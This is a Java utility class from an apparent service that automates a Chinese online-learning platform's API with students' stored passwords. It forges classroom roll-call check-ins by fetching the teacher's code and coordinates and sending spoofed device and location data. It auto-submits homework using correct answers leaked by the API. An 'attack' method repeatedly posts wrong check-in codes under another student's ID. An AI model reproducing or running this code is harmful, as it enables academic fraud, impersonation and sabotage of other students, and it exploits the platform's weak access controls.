package vip.wqby.ccitserver.util;

import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.mongodb.client.result.UpdateResult;
import net.mamoe.mirai.message.data.At;
import net.mamoe.mirai.message.data.Message;
import net.mamoe.mirai.message.data.MessageChainBuilder;
import net.mamoe.mirai.message.data.SingleMessage;
import okhttp3.*;
import org.springframework.data.mongodb.core.MongoTemplate;
import org.springframework.data.mongodb.core.query.Criteria;
import org.springframework.data.mongodb.core.query.Query;
import org.springframework.data.mongodb.core.query.Update;
import vip.wqby.ccitserver.config.SpringUtil;
import vip.wqby.ccitserver.pojo.Course;
import vip.wqby.ccitserver.pojo.homework;
import vip.wqby.ccitserver.pojo.task.emailTask;
import vip.wqby.ccitserver.pojo.task.noteTask;
import vip.wqby.ccitserver.pojo.task.qqMessageTask;
import vip.wqby.ccitserver.pojo.task.rollCallTask;
import vip.wqby.ccitserver.queue.AllQueue;
import vip.wqby.ccitserver.util.http.Http;
import vip.wqby.ccitserver.util.http.HttpResponse;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.util.*;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

public class IbsUtils {
    Http http = new Http();
    private JSONObject json = null;
    private HttpResponse response = null;
    private String userID = "";
    private String token = "";
    private String Email = "";
    private String Phone = "";

    {
        http.AutoCookie();
        http.setContentType("application/json");
    }


    public void login(String username, String password) throws IOException {
        http.open("https://coreapi.iflysse.com/ibosi/Login/v1/Login");
        response = http.post("{\n" +
                "\t\"Account\": \"" + username + "\",\n" +
                "\t\"Pwd\": \"" + password + "\"\n" +
                "}");
        System.out.println(response.getBody());
        json = JSONObject.parseObject(response.getBody());
        JSONObject json_data = json.getJSONObject("data");
        userID = json_data.getString("UserID");
        token = json_data.getString("Token");
        Email = json_data.getString("Email");
        Phone = json_data.getString("Phone");

        System.out.println(userID);
        System.out.println(token);
        System.out.println(Email);
        System.out.println(Phone);
        http.setHeader("Token", token);
    }


    public ArrayList<homework> getHomeWorkList(String username, String password) throws IOException {
        login(username, password);

        ArrayList<homework> list = new ArrayList<>();

        http.open("https://coreapi.iflysse.com/onlineclass/ClassRoom/GetClassListByStu");
        response = http.post("{\"ClassState\":\"1\",\"UserID\":\"" + userID + "\"}");
        json = JSONObject.parseObject(response.getBody());
        JSONArray jsonArray_Data = json.getJSONArray("Data");
        for (int i = 0; i < jsonArray_Data.size(); i++) {
            JSONObject jsonObject = jsonArray_Data.getJSONObject(i);
            String courseName = jsonObject.getString("Name");
            String teacherName = jsonObject.getString("TeacherName");
            String courseID = jsonObject.getString("ObjectID");
            System.out.println(courseName + "  " + teacherName);

            http.open("https://coreapi.iflysse.com/onlineclass/ClassRoom/GetMyteachingActivityListNew");
            response = http.post("{\"PageSize\":999,\"UserID\":\"" + userID + "\",\"StuTeachingState\":\"1\",\"ClassID\":\"" + courseID + "\",\"PageIndex\":\"0\"}");
            json = JSONObject.parseObject(response.getBody());
            JSONArray jsonArray_data = json.getJSONArray("data");
            for (int j = 0; j < jsonArray_data.size(); j++) {
                String homeworkName = jsonArray_data.getJSONObject(j).getString("Name");
                String endTime = jsonArray_data.getJSONObject(j).getString("EndTime");
                String homeWordID = jsonArray_data.getJSONObject(j).getString("ObjectID");
                String BusinessID = jsonArray_data.getJSONObject(j).getString("BusinessID");
                String EndTime = jsonArray_data.getJSONObject(j).getString("EndTime");
                int SubType = jsonArray_data.getJSONObject(j).getInteger("SubType");
                System.out.println("====" + homeworkName + " " + endTime + " " + homeWordID);
                //只添加选择题
//                System.out.println(SubType);
                if (SubType == 33) {
                    //获取题目数量
                    http.open("https://coreapi.iflysse.com/onlineclass/StuObjectiveHomeWork/GetStuObjectiveScore");
                    response = http.post("{\"MyTaskID\":\"" + BusinessID + "\"}");
                    System.out.println(response.getBody());
                    json = JSONObject.parseObject(response.getBody());
                    String QuestionNum = json.getJSONObject("data").getString("QuestionNum");
                    String CountdownStr = json.getJSONObject("data").getString("CountdownStr");
                    list.add(new homework(teacherName, courseID, courseName, homeWordID, homeworkName, BusinessID, EndTime, QuestionNum, CountdownStr, username, password));
                }
            }
        }
        System.out.println(list);
        return list;
    }

    public ArrayList<Course> getCourseList(String username, String password) throws Exception {
        login(username, password);

        ArrayList<Course> list = new ArrayList<>();

        http.open("https://coreapi.iflysse.com/onlineclass/ClassRoom/GetClassListByStu");
        response = http.post("{\"ClassState\":\"1\",\"UserID\":\"" + userID + "\"}");
        json = JSONObject.parseObject(response.getBody());
        JSONArray jsonArray_Data = json.getJSONArray("Data");
        for (int i = 0; i < jsonArray_Data.size(); i++) {
            JSONObject jsonObject = jsonArray_Data.getJSONObject(i);
            System.out.println(jsonObject);
            String courseName = jsonObject.getString("Name");
            String teacherName = jsonObject.getString("TeacherName");
            String courseID = jsonObject.getString("ObjectID");
            String endTime = jsonObject.getString("EndTime");
            System.out.println(courseName + "  " + teacherName + "  " + courseID);
            list.add(new Course(username, password, courseName, teacherName, courseID, endTime, userID, token));
        }
        return list;
    }
    //QQ@消息的记录
    public static MessageChainBuilder messageChainBuilder = new MessageChainBuilder();

    public static void addMessage(SingleMessage singleMessage) {
        messageChainBuilder.append(singleMessage);
    }

    public static void addMessage(Message message) {
        messageChainBuilder.append(message);
    }

    public static void addMessage(CharSequence charSequence) {
        messageChainBuilder.append(charSequence);
    }


    public void doRollCallList(List<rollCallTask> rollCallTaskArrayList) {

        CountDownLatch countDownLatch = new CountDownLatch(rollCallTaskArrayList.size());
        for (rollCallTask rct : rollCallTaskArrayList) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        Http http = new Http();
                        http.AutoCookie();
                        http.setContentType("application/json");
                        http.setHeader("Token", rct.getToken());

                        JSONObject json = null;
                        HttpResponse response = null;
                        String userID = "";
                        String token = "";
                        String Email = "";
                        String Phone = "";
                        String Name  ="";

                        //获取个人信息
                        http.open("https://coreapi.iflysse.com/ibosi/Person/v1/GetPersonInfo");
                        response = http.post();
                        json = JSONObject.parseObject(response.getBody());
                        //System.out.println(json);
                        if (json.toJSONString().indexOf("\"Msg\":\"token过期\"") != -1) {
                            //token过期
                            http.open("https://coreapi.iflysse.com/ibosi/Login/v1/Login");
                            response = http.post("{\n" +
                                    "\t\"Account\": \"" + rct.getUsername() + "\",\n" +
                                    "\t\"Pwd\": \"" + rct.getPassword() + "\"\n" +
                                    "}");
                            //System.out.println(response.getBody());
                            json = JSONObject.parseObject(response.getBody());
                            JSONObject json_data = json.getJSONObject("data");
                            userID = json_data.getString("UserID");
                            token = json_data.getString("Token");
                            //System.out.println(userID);
                            //System.out.println(token);
                            http.setHeader("Token", token);
                            //获取个人信息
                            http.open("https://coreapi.iflysse.com/ibosi/Person/v1/GetPersonInfo");
                            response = http.post();
                            json = JSONObject.parseObject(response.getBody());
                            Phone = json.getJSONObject("data").getString("Phone");
                            Email = json.getJSONObject("data").getString("Email");
                            Name = json.getJSONObject("data").getString("Name");

                            //登录后新的token和userID已经获取完毕，
                            //更新token和userID到数据库
                            MongoTemplate mongoTemplate = (MongoTemplate) SpringUtil.getBean("mongoTemplate");
                            Query query = new Query(Criteria.where("username").is(rct.getUsername()).and("courseId").is(rct.getCourseId()));

                            Update update = new Update().set("token", token).set("userId", userID);
                            UpdateResult ibsqdUserList = mongoTemplate.updateFirst(query, update, "ibsqdUserList");
                            //System.out.println(ibsqdUserList.getModifiedCount());
                            //重新赋值token 重新获取 继续执行
                            http.setHeader("Token", token);
                            http.open("https://coreapi.iflysse.com/onlineclass/ClassRoom/GetMyteachingActivityListNew");
                            response = http.post("{\"PageSize\":10,\"UserID\":\"" + userID + "\",\"StuTeachingState\":\"1\",\"ClassID\":\"" + rct.getCourseId() + "\",\"PageIndex\":\"0\"}");
                            json = JSONObject.parseObject(response.getBody());

                        }else{
                            Phone = json.getJSONObject("data").getString("Phone");
                            Email = json.getJSONObject("data").getString("Email");
                            Name = json.getJSONObject("data").getString("Name");

                            http.open("https://coreapi.iflysse.com/onlineclass/ClassRoom/GetMyteachingActivityListNew");
                            response = http.post("{\"PageSize\":10,\"UserID\":\"" + rct.getUserId() + "\",\"StuTeachingState\":\"1\",\"ClassID\":\"" + rct.getCourseId() + "\",\"PageIndex\":\"0\"}");
                            json = JSONObject.parseObject(response.getBody());
                        }


/*
//                        System.out.println(json.toJSONString());
                        if (json.toJSONString().indexOf("\"Msg\":\"token过期\"") != -1) {
                            //token过期
                            http.open("https://coreapi.iflysse.com/ibosi/Login/v1/Login");
                            response = http.post("{\n" +
                                    "\t\"Account\": \"" + rct.getUsername() + "\",\n" +
                                    "\t\"Pwd\": \"" + rct.getPassword() + "\"\n" +
                                    "}");
                            System.out.println(response.getBody());
                            json = JSONObject.parseObject(response.getBody());
                            JSONObject json_data = json.getJSONObject("data");
                            userID = json_data.getString("UserID");
                            token = json_data.getString("Token");
                            System.out.println(userID);
                            System.out.println(token);
                            http.setHeader("Token", token);
                            //获取个人信息
                            http.open("https://coreapi.iflysse.com/ibosi/Person/v1/GetPersonInfo");
                            response = http.post();
                            json = JSONObject.parseObject(response.getBody());
                            Phone = json.getJSONObject("data").getString("Phone");
                            Email = json.getJSONObject("data").getString("Email");
                            Name = json.getJSONObject("data").getString("Name");

                            //登录后新的token和userID已经获取完毕，
                            //更新token和userID到数据库
                            MongoTemplate mongoTemplate = (MongoTemplate) SpringUtil.getBean("mongoTemplate");
                            Query query = new Query(Criteria.where("username").is(rct.getUsername()).and("courseID").is(rct.getCourseId()));
                            Update update = new Update().set("token", token).set("userId", userID);
                            mongoTemplate.updateFirst(query, update, "ibsqdUserList");
                            //重新赋值token 重新获取 继续执行
                            http.setHeader("Token", token);
                            http.open("https://coreapi.iflysse.com/onlineclass/ClassRoom/GetMyteachingActivityListNew");
                            response = http.post("{\"PageSize\":10,\"UserID\":\"" + userID + "\",\"StuTeachingState\":\"1\",\"ClassID\":\"" + rct.getCourseId() + "\",\"PageIndex\":\"0\"}");
                            json = JSONObject.parseObject(response.getBody());
                        }

*/

                        //解析任务数组 判断有无签到任务
                        JSONArray jsonArray_data = json.getJSONArray("data");
                        //System.out.println(jsonArray_data);
                        for (int i = 0; i < jsonArray_data.size(); i++) {
                            String TeachingActivityID = jsonArray_data.getJSONObject(i).getString("TeachingActivityID");
                            String BusinessID = jsonArray_data.getJSONObject(i).getString("BusinessID");
                            String StuName = jsonArray_data.getJSONObject(i).getString("StuName");
                            String StuID = jsonArray_data.getJSONObject(i).getString("StuID");
                            int Type = jsonArray_data.getJSONObject(i).getInteger("Type");
                            int StateDetail = jsonArray_data.getJSONObject(i).getInteger("StateDetail");

                            String taskName = jsonArray_data.getJSONObject(i).getString("Name");

                            //或者 IsReward==false
                            if (Type == 5 && StateDetail!=2) {//Type == 5 && StateDetail!=2
                                String PointX = "";
                                String PointY = "";
                                String PointZ = "";
                                String code = "";

                                //有点名签到了
                                System.out.println("签到来了");
                                LogUtils.info(TeachingActivityID, BusinessID);
                                //取出RollCallID
                                http.open("https://coreapi.iflysse.com/onlineclass/TeachingRollCall/GetRollCallByStu");
                                response = http.post("{\"PointY\":119.959916,\"PointX\":31.68246,\"MyTeachingID\":\"" + TeachingActivityID + "\",\"BusinessID\":\"" + BusinessID + "\"}");
                                json = JSONObject.parseObject(response.getBody());
                                //System.out.println(json);
                                String RollCallID = json.getJSONObject("Data").getString("RollCallID");
                                //System.out.println("RollCallID="+RollCallID);

                                //获取签到码和老师坐标
                                http.open("https://coreapi.iflysse.com/onlineclass/TeachingRollCall/GetRollCallDetailsByRollCallID");
                                response = http.post("{\n" +
                                        "    \"RollCallID\":\"" + RollCallID + "\",\n" +
                                        "    \"IsPunch\":false,\n" +
                                        "    \"PageSize\": 100\n" +
                                        "}");
                                json = JSONObject.parseObject(response.getBody());
                                //System.out.println("第一种方法获取");
                                //System.out.println(json);
                                PointX = json.getJSONObject("Data").getString("PointX");
                                PointY = json.getJSONObject("Data").getString("PointY");
                                PointZ = json.getJSONObject("Data").getString("PointZ");
                                code = json.getJSONObject("Data").getString("Code");
                                //System.out.println("code="+code);
/*
                                //第二种获取方法 直接获取全班所有的签到信息
                                http.open("https://coreapi.iflysse.com/onlineclass/TeachingRollCall/GetRollCallDetailsBySearch");
                                response = http.post("{\n" +
                                        "    \"RollCallID\":\"" + RollCallID + "\",\n" +
                                        "    \"PageStart\":\"0\",\n" +
                                        "    \"PageSize\":100,\n" +
                                        "    \"SearchContent\":\"0\"\n" +
                                        "}");
                                json = JSONObject.parseObject(response.getBody());
                                System.out.println("第二种方法获取");
                                System.out.println(json);
//                                if (json.getJSONArray("Data").getJSONObject(0).getBoolean("IsPunch") == true) {
                                //随便取第一个大哥的签到数据 也可以改一下 取已经签完的大神的数据
                                code = json.getJSONArray("Data").getJSONObject(0).getString("Code");
                                System.out.println("code="+code);
                                PointX = json.getJSONArray("Data").getJSONObject(0).getString("PointX");
                                PointY = json.getJSONArray("Data").getJSONObject(0).getString("PointY");
                                PointZ = json.getJSONArray("Data").getJSONObject(0).getString("PointZ");*/

//                                }

                                //没获取到签到码 直接跳过 后面这行要删掉
                                if (code.equals("")) {
                                    continue;
                                }
                                //拿到数据后开始签到
                                http.open("https://coreapi.iflysse.com/onlineclass/TeachingRollCall/ModifyRollCallDetailsTrueForStudent");
                                response = http.post("{\"StuName\":\"" + StuName + "\",\n" +
                                        "\"PhoneID\":\"6aca306821c27faa9ebfd60725a2f68f\",\n" +
                                        "\"ObjectID\":\"" + BusinessID + "\",\n" +
                                        "\"RollCallID\":\"" + RollCallID + "\",\n" +
                                        "\"StuID\":\"" + StuID + "\",\n" +
                                        "\"PhoneBrand\":\"GooglePixel\",\n" +
                                        "\"PointY\":" + PointY + ",\n" +
                                        "\"PointX\":" + PointX + ",\n" +
                                        "\"PointZ\":" + PointZ + ",\n" +
                                        "\"Code\":\"" + code + "\",\n" +
                                        "\"System\":\"ANDROID\"}");
                                json = JSONObject.parseObject(response.getBody());
                                if (json.getString("Msg").indexOf("成功")!=-1){
                                    AllQueue.emailTaskQueue.add(new emailTask("i博思上课签到已完成","懒B"+Name+"，你的《"+taskName+"》已经帮你签完了",Email));
                                    IbsUtils.addMessage(Name+",");
                                }
                            }
                        }

                    } catch (Exception e) {
                        e.printStackTrace();
                        AllQueue.emailTaskQueue.add(new emailTask("i博思上课签到失败","签到失败，遇到异常",Email));
                    } finally {
                        countDownLatch.countDown();
                    }
                }
            }).start();
        }
        //最多不能超过30秒
        try {
            countDownLatch.await(30, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

    }

    public void attack(String username,String password,String courseID,String token,String userID,String stuID){
        try {
            http.setHeader("Token", token);

            http.open("https://coreapi.iflysse.com/onlineclass/ClassRoom/GetMyteachingActivityListNew");
            response = http.post("{\"PageSize\":10,\"UserID\":\"" + userID + "\",\"StuTeachingState\":\"0\",\"ClassID\":\"" + courseID + "\",\"PageIndex\":\"0\"}");
            json = JSONObject.parseObject(response.getBody());
            System.out.println(json.toJSONString());
            if (json.toJSONString().indexOf("\"Msg\":\"token过期\"") != -1) {
                //token过期
                login(username, password);
                token = this.token;
                userID = this.userID;
                //更新token和userID到数据库
                MongoTemplate mongoTemplate = (MongoTemplate) SpringUtil.getBean("mongoTemplate");
                Query query = new Query(Criteria.where("username").is(username).and("courseID").is(courseID));
                Update update = new Update().set("token", token).set("userId", userID);
                mongoTemplate.updateFirst(query, update, "ibsqdUserList");
                //重新赋值token 重新获取 继续执行
                http.setHeader("Token", token);
                http.open("https://coreapi.iflysse.com/onlineclass/ClassRoom/GetMyteachingActivityListNew");
                response = http.post("{\"PageSize\":10,\"UserID\":\"" + userID + "\",\"StuTeachingState\":\"0\",\"ClassID\":\"" + courseID + "\",\"PageIndex\":\"0\"}");
                json = JSONObject.parseObject(response.getBody());
            }
            //解析任务数组 判断有无签到任务
            JSONArray jsonArray_data = json.getJSONArray("data");
            for (int i = 0; i < jsonArray_data.size(); i++) {
                String TeachingActivityID = jsonArray_data.getJSONObject(i).getString("TeachingActivityID");
                String BusinessID = jsonArray_data.getJSONObject(i).getString("BusinessID");
                String StuName = jsonArray_data.getJSONObject(i).getString("StuName");
                //这里不要用自己的了 改为攻击者的
                /*String StuID = jsonArray_data.getJSONObject(i).getString("StuID");*/
                int Type = jsonArray_data.getJSONObject(i).getInteger("Type");
                Date StartTime = jsonArray_data.getJSONObject(i).getDate("StartTime");
                Date EndTime = jsonArray_data.getJSONObject(i).getDate("EndTime");
                Date nowTime = new Date();
//                System.out.println("StartTime "+StartTime);
//                System.out.println("nowTime "+nowTime);
//                System.out.println("EndTime "+EndTime);

//                int StateDetail = jsonArray_data.getJSONObject(i).getInteger("StateDetail");
                if (Type == 5 && nowTime.before(EndTime) && nowTime.after(StartTime)) {  // && StateDetail != 2 不要判断状态了
                    String PointX = "";
                    String PointY = "";
                    String PointZ = "";
                    String code = "";
                    //有点名签到了
                    System.out.println("签到来了");
                    LogUtils.info(TeachingActivityID, BusinessID);
                    //取出RollCallID
                    http.open("https://coreapi.iflysse.com/onlineclass/TeachingRollCall/GetRollCallByStu");
                    response = http.post("{\"PointY\":119.959916,\"PointX\":31.68246,\"MyTeachingID\":\"" + TeachingActivityID + "\",\"BusinessID\":\"" + BusinessID + "\"}");
                    json = JSONObject.parseObject(response.getBody());
                    System.out.println(json);
                    String RollCallID = json.getJSONObject("Data").getString("RollCallID");
                    //获取签到码和老师坐标
                    http.open("https://coreapi.iflysse.com/onlineclass/TeachingRollCall/GetRollCallDetailsByRollCallID");
                    response = http.post("{\n" +
                            "    \"RollCallID\":\"" + RollCallID + "\",\n" +
                            "    \"IsPunch\":false,\n" +
                            "    \"PageSize\": 100\n" +
                            "}");
                    json = JSONObject.parseObject(response.getBody());
                    System.out.println("第一种方法获取");
                    System.out.println(json);
                    PointX = json.getJSONObject("Data").getString("PointX");
                    PointY = json.getJSONObject("Data").getString("PointY");
                    PointZ = json.getJSONObject("Data").getString("PointZ");
                    code = json.getJSONObject("Data").getString("Code");


                    /*
                    //第二种获取方法 直接获取全班所有的签到信息
                    http.open("https://coreapi.iflysse.com/onlineclass/TeachingRollCall/GetRollCallDetailsBySearch");
                    response = http.post("{\n" +
                            "    \"RollCallID\":\"" + RollCallID + "\",\n" +
                            "    \"PageStart\":\"0\",\n" +
                            "    \"PageSize\":100,\n" +
                            "    \"SearchContent\":\"0\"\n" +
                            "}");
                    json = JSONObject.parseObject(response.getBody());
                    System.out.println("第二种方法获取");
                    System.out.println(json);
//                    if (json.getJSONArray("Data").getJSONObject(0).getBoolean("IsPunch") == true) {
                    //有人已经签到完了
                    code = json.getJSONArray("Data").getJSONObject(0).getString("Code");
                    PointX = json.getJSONArray("Data").getJSONObject(0).getString("PointX");
                    PointY = json.getJSONArray("Data").getJSONObject(0).getString("PointY");
                    PointZ = json.getJSONArray("Data").getJSONObject(0).getString("PointZ");
//                    }
*/

                    //没获取到签到码 直接跳过 后面这行要删掉
                    if (code.equals("")) {
                        continue;
                    }

                    for (int j = 0 ; j < 5 ; j ++){
                        //拿到数据后开始签到
                        http.open("https://coreapi.iflysse.com/onlineclass/TeachingRollCall/ModifyRollCallDetailsTrueForStudent");
                        response = http.post("{\"StuName\":\"" + StuName + "\",\n" +
                                "\"PhoneID\":\"6aca306821c27faa9ebfd60725a2f68f\",\n" +
                                "\"ObjectID\":\"" + BusinessID + "\",\n" +
                                "\"RollCallID\":\"" + RollCallID + "\",\n" +
                                "\"StuID\":\"" + stuID + "\",\n" +
                                "\"PhoneBrand\":\"GooglePixel\",\n" +
                                "\"PointY\":" + PointY + ",\n" +
                                "\"PointX\":" + PointX + ",\n" +
                                "\"PointZ\":" + PointZ + ",\n" +
                                "\"Code\":\"" + (Integer.valueOf(code)-1) + "\",\n" +
                                "\"System\":\"ANDROID\"}");
                        json = JSONObject.parseObject(response.getBody());
                        System.out.println("错误返回结果 "+json.toJSONString());
                    }


                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }

    }


//
//    public void doRollCall(String username, String password, String courseID, String token, String userID) {
//        try {
//            http.setHeader("Token", token);
//
//            http.open("https://coreapi.iflysse.com/onlineclass/ClassRoom/GetMyteachingActivityListNew");
//            response = http.post("{\"PageSize\":10,\"UserID\":\"" + userID + "\",\"StuTeachingState\":\"1\",\"ClassID\":\"" + courseID + "\",\"PageIndex\":\"0\"}");
//            json = JSONObject.parseObject(response.getBody());
//            System.out.println(json.toJSONString());
//            if (json.toJSONString().indexOf("\"Msg\":\"token过期\"") != -1) {
//                //token过期
//                login(username, password);
//                token = this.token;
//                userID = this.userID;
//                //更新token和userID到数据库
//                MongoTemplate mongoTemplate = (MongoTemplate) SpringUtil.getBean("mongoTemplate");
//                Query query = new Query(Criteria.where("username").is(username).and("courseID").is(courseID));
//                Update update = new Update().set("token", token).set("userId", userID);
//                mongoTemplate.updateFirst(query, update, "ibsqdUserList");
//                //重新赋值token 重新获取 继续执行
//                http.setHeader("Token", token);
//                http.open("https://coreapi.iflysse.com/onlineclass/ClassRoom/GetMyteachingActivityListNew");
//                response = http.post("{\"PageSize\":10,\"UserID\":\"" + userID + "\",\"StuTeachingState\":\"1\",\"ClassID\":\"" + courseID + "\",\"PageIndex\":\"0\"}");
//                json = JSONObject.parseObject(response.getBody());
//            }
//            //解析任务数组 判断有无签到任务
//            JSONArray jsonArray_data = json.getJSONArray("data");
//            for (int i = 0; i < jsonArray_data.size(); i++) {
//                String TeachingActivityID = jsonArray_data.getJSONObject(i).getString("TeachingActivityID");
//                String BusinessID = jsonArray_data.getJSONObject(i).getString("BusinessID");
//                String StuName = jsonArray_data.getJSONObject(i).getString("StuName");
//                String StuID = jsonArray_data.getJSONObject(i).getString("StuID");
//                int Type = jsonArray_data.getJSONObject(i).getInteger("Type");
//                int StateDetail = jsonArray_data.getJSONObject(i).getInteger("StateDetail");
//                if (Type == 5 && StateDetail!=2) {
//                    String PointX = "";
//                    String PointY = "";
//                    String PointZ = "";
//                    String code = "";
//
//                    //有点名签到了
//                    System.out.println("签到来了");
//                    LogUtils.info(TeachingActivityID, BusinessID);
//                    //取出RollCallID
//                    http.open("https://coreapi.iflysse.com/onlineclass/TeachingRollCall/GetRollCallByStu");
//                    response = http.post("{\"PointY\":119.959916,\"PointX\":31.68246,\"MyTeachingID\":\"" + TeachingActivityID + "\",\"BusinessID\":\"" + BusinessID + "\"}");
//                    json = JSONObject.parseObject(response.getBody());
//                    System.out.println(json);
//                    String RollCallID = json.getJSONObject("Data").getString("RollCallID");
//                    //获取签到码和老师坐标
//                    http.open("https://coreapi.iflysse.com/onlineclass/TeachingRollCall/GetRollCallDetailsByRollCallID");
//                    response = http.post("{\n" +
//                            "    \"RollCallID\":\"" + RollCallID + "\",\n" +
//                            "    \"IsPunch\":false,\n" +
//                            "    \"PageSize\": 100\n" +
//                            "}");
//                    json = JSONObject.parseObject(response.getBody());
//                    System.out.println("第一种方法获取");
//                    System.out.println(json);
//                    PointX = json.getJSONObject("Data").getString("PointX");
//                    PointY = json.getJSONObject("Data").getString("PointY");
//                    PointZ = json.getJSONObject("Data").getString("PointZ");
//                    code = json.getJSONObject("Data").getString("Code");
//                    //第二种获取方法 直接获取全班所有的签到信息
//                    http.open("https://coreapi.iflysse.com/onlineclass/TeachingRollCall/GetRollCallDetailsBySearch");
//                    response = http.post("{\n" +
//                            "    \"RollCallID\":\"" + RollCallID + "\",\n" +
//                            "    \"PageStart\":\"0\",\n" +
//                            "    \"PageSize\":100,\n" +
//                            "    \"SearchContent\":\"0\"\n" +
//                            "}");
//                    json = JSONObject.parseObject(response.getBody());
//                    System.out.println("第二种方法获取");
//                    System.out.println(json);
////                    if (json.getJSONArray("Data").getJSONObject(0).getBoolean("IsPunch") == true) {
//                        //有人已经签到完了
//                        code = json.getJSONArray("Data").getJSONObject(0).getString("Code");
//                        PointX = json.getJSONArray("Data").getJSONObject(0).getString("PointX");
//                        PointY = json.getJSONArray("Data").getJSONObject(0).getString("PointY");
//                        PointZ = json.getJSONArray("Data").getJSONObject(0).getString("PointZ");
////                    }
//
//                    //没获取到签到码 直接跳过 后面这行要删掉
//                    if (code.equals("")) {
//                        continue;
//                    }
//                    //拿到数据后开始签到
//                    http.open("https://coreapi.iflysse.com/onlineclass/TeachingRollCall/ModifyRollCallDetailsTrueForStudent");
//                    response = http.post("{\"StuName\":\"" + StuName + "\",\n" +
//                            "\"PhoneID\":\"6aca306821c27faa9ebfd60725a2f68f\",\n" +
//                            "\"ObjectID\":\"" + BusinessID + "\",\n" +
//                            "\"RollCallID\":\"" + RollCallID + "\",\n" +
//                            "\"StuID\":\"" + StuID + "\",\n" +
//                            "\"PhoneBrand\":\"GooglePixel\",\n" +
//                            "\"PointY\":" + PointY + ",\n" +
//                            "\"PointX\":" + PointX + ",\n" +
//                            "\"PointZ\":" + PointZ + ",\n" +
//                            "\"Code\":\"" + code + "\",\n" +
//                            "\"System\":\"ANDROID\"}");
//                    json = JSONObject.parseObject(response.getBody());
//
//                }
//            }
//
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//    }


    public void doHomeWork(String username, String password, String MyTaskID, String time) {
        try {
            login(username, password);

            http.open("https://coreapi.iflysse.com/onlineclass/StuObjectiveHomeWork/DoObjectiveTask");
            response = http.post("{\"MyTaskID\":\"" + MyTaskID + "\"}");
            json = JSONObject.parseObject(response.getBody());
            String MyTaskDetID = json.getJSONObject("data").getString("MyTaskDetID");
            String ClassID = json.getJSONObject("data").getString("ClassID");
            String EndTime = json.getJSONObject("data").getString("EndTime");

            http.open("https://coreapi.iflysse.com/onlineclass/StuObjectiveHomeWork/GetStuTaskQuestionDetailList");
            response = http.post("{\"MyTaskID\":\"" + MyTaskID + "\"}");
            json = JSONObject.parseObject(response.getBody());
            JSONArray jsonArray_MyQuestionList = json.getJSONObject("data").getJSONArray("MyQuestionList");

            CountDownLatch latch = new CountDownLatch(jsonArray_MyQuestionList.size());
            //做题

            for (int i = 0; i < jsonArray_MyQuestionList.size(); i++) {
                String objectID = jsonArray_MyQuestionList.getJSONObject(i).getString("ObjectID");

                if (jsonArray_MyQuestionList.getJSONObject(i).getInteger("Type") != 1 && jsonArray_MyQuestionList.getJSONObject(i).getInteger("Type") != 2) {
                    throw new Exception("异常题目类型");
                }

                JSONArray optionList = jsonArray_MyQuestionList.getJSONObject(i).getJSONArray("OptionList");
                String answer = "";
                for (int j = 0; j < optionList.size(); j++) {
                    if (optionList.getJSONObject(j).getBoolean("IsTrue").equals(true)) {
                        answer += optionList.getJSONObject(j).getString("Name")+",";
                    }
                }

                if (answer.equals("")) {
                    throw new Exception("读取答案异常");
                }

                //去除尾部逗号
                answer = answer.substring(0,answer.length()-1);

                OkHttpClient client = new OkHttpClient.Builder().build();
                RequestBody requestBody = RequestBody.create(MediaType.parse("application/json;charset=utf-8")
                        , "{\"MyAnswer\":\"" + answer + "\",\"QuestionID\":\"" + objectID + "\",\"MyTaskID\":\"" + MyTaskID + "\"}");
                Request request = new Request.Builder()
                        .url("https://coreapi.iflysse.com/onlineclass/StuObjectiveHomeWork/SaveStuTaskQuestion")
                        .post(requestBody)
                        .addHeader("Token", token)
                        .addHeader("Content-Type", "application/json")
                        .build();
                Call call = client.newCall(request);
                call.enqueue(new Callback() {
                    @Override
                    public void onFailure(Call call, IOException e) {
                        //异步请求失败之后的回调
                        System.out.println("onFailure: " + e.toString());
                        latch.countDown();
                    }

                    @Override
                    public void onResponse(Call call, Response response) throws IOException {
                        //异步请求成功之后的回调
                        int code = response.code();
                        if ((code == HttpURLConnection.HTTP_OK)) {
                            ResponseBody body = response.body();
                            System.out.println("onResponse: " + body.string());
                            latch.countDown();
                        }
                    }
                });
            }
            System.out.println("main thread await. ");
            latch.await(90, TimeUnit.SECONDS);
            System.out.println("main thread finishes await. ");

            //投递邮件和短信
            AllQueue.emailTaskQueue.add(new emailTask("i博思任务已完成", "您于" + time + "提交的i博思任务已完成，请打开i博思查看作业进度\n注意:请控制好答题时间和分数在合理范围内再提交", Email));
            AllQueue.noteTaskQueue.add(new noteTask(Phone, "1371118", new String[]{time}));
        } catch (Exception e) {
            AllQueue.emailTaskQueue.add(new emailTask("i博思任务失败", "您于" + time + "提交的i博思任务执行失败遇到未知异常，请联系王权霸业反馈", Email));
            AllQueue.noteTaskQueue.add(new noteTask(Phone, "1371200", new String[]{time}));
        }
    }


}


//            //选择答案
//            http.open("https://coreapi.iflysse.com/onlineclass/StuObjectiveHomeWork/SaveStuTaskQuestion");
//            response= http.post("{\"MyAnswer\":\"" + answer + "\",\"QuestionID\":\"" + objectID + "\",\"MyTaskID\":\"" + MyTaskID + "\"}");
//            System.out.println(response.getBody());


//        //刷时长
//        http.open("https://coreapi.iflysse.com/behavior/tasktimes/StartTaskTimes");
//        response = http.post("{\n" +
//                "\t\"FinishCallBack\": \"\",\n" +
//                "\t\"LimitTime\": \""+EndTime+"\",\n" +
//                "\t\"IntervalSec\": 100,\n" +
//                "\t\"TaskMstID\": \""+MyTaskID+"\",\n" +
//                "\t\"ClassId\": \""+ClassID+"\",\n" +
//                "\t\"TaskDetID\": \""+MyTaskDetID+"\",\n" +
//                "\t\"AsyncFuntion\": \"UpdateHomeWorkRecord_db\",\n" +
//                "\t\"TimeType\": \"作业用时\",\n" +
//                "\t\"LimitValue\": 0\n" +
//                "}");
//        System.out.println(response.getBody());